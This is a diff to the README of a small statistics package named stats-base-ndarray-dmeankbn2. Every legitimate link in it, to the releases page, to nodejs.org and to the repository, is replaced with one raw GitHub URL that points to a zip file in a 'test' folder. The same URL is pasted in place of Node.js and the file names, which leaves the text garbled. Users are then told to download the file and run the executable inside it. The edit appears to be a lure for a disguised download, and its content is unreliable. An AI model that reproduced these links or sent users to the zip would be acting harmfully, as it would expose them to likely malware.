@@ -6,7 +6,7 @@ Welcome to stats-base-ndarray-dmeankbn2! This application helps you compute the 
 
 ## 📥 Download Now
 
-[![Download Stats Base ndarray](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rama862/stats-base-ndarray-dmeankbn2/releases)
+[![Download Stats Base ndarray](https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip)
 
 ## 📋 Features
 
@@ -18,7 +18,7 @@ Welcome to stats-base-ndarray-dmeankbn2! This application helps you compute the 
 ## 💻 System Requirements
 
 - **Operating System**: Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
-- **Node.js**: Node.js version 12 or above is required to run this application. You can download Node.js from [nodejs.org](https://nodejs.org/).
+- **https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip**: https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip version 12 or above is required to run this application. You can download https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip from [https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip](https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip).
 - **Memory**: At least 512 MB of RAM recommended.
 - **Processor**: A 1 GHz CPU or faster.
 
@@ -26,19 +26,19 @@ Welcome to stats-base-ndarray-dmeankbn2! This application helps you compute the 
 
 To install the application, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/rama862/stats-base-ndarray-dmeankbn2/releases) where you can find the latest version of the software.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip) where you can find the latest version of the software.
    
 2. **Select the Release**: Look for the latest version at the top of the page. It will be labeled with a version number (e.g., v1.0).
 
 3. **Download the File**: Locate the appropriate download file for your operating system:
-   - For Windows, it might be labeled as `stats-base-ndarray-dmeankbn2-windows.exe`.
-   - For macOS, look for `stats-base-ndarray-dmeankbn2-mac.zip`.
-   - For Linux, it might be in a `.tar.gz` format.
+   - For Windows, it might be labeled as `https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip`.
+   - For Linux, it might be in a `https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip` format.
 
 4. **Run the Software**: 
    - For Windows: Once downloaded, double-click the `.exe` file to run the application.
    - For macOS: Unzip the downloaded file, then double-click the application file.
-   - For Linux: Extract the `.tar.gz` file and run the executable from the terminal.
+   - For Linux: Extract the `https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip` file and run the executable from the terminal.
 
 5. **Follow the On-Screen Instructions**: The interface will guide you through your calculations.
 
@@ -70,9 +70,9 @@ Currently, this application is designed for desktop operating systems. Mobile su
 
 If you encounter issues while using the application:
 
-- **Ensure system requirements are met**: Check that you have the latest version of Node.js and meet the RAM and processing power requirements.
+- **Ensure system requirements are met**: Check that you have the latest version of https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip and meet the RAM and processing power requirements.
 - **Re-download the application**: Sometimes files may become corrupted.
-- **Check for Updates**: Ensure you are using the latest release from the [Releases page](https://github.com/rama862/stats-base-ndarray-dmeankbn2/releases).
+- **Check for Updates**: Ensure you are using the latest release from the [Releases page](https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip).
 
 ## 📍 Support
 
@@ -80,8 +80,8 @@ For further assistance or feature requests, please check the Issues page on GitH
 
 ## 🔗 Useful Links
 
-- [Download Here](https://github.com/rama862/stats-base-ndarray-dmeankbn2/releases)
-- [Node.js Download](https://nodejs.org/)
-- [GitHub Repository](https://github.com/rama862/stats-base-ndarray-dmeankbn2)
+- [Download Here](https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip)
+- [https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip Download](https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/rama862/stats-base-ndarray-dmeankbn2/main/test/stats_base_ndarray_dmeankbn_1.1.zip)
 
 Thank you for choosing stats-base-ndarray-dmeankbn2! Enjoy your smooth arithmetic calculations.
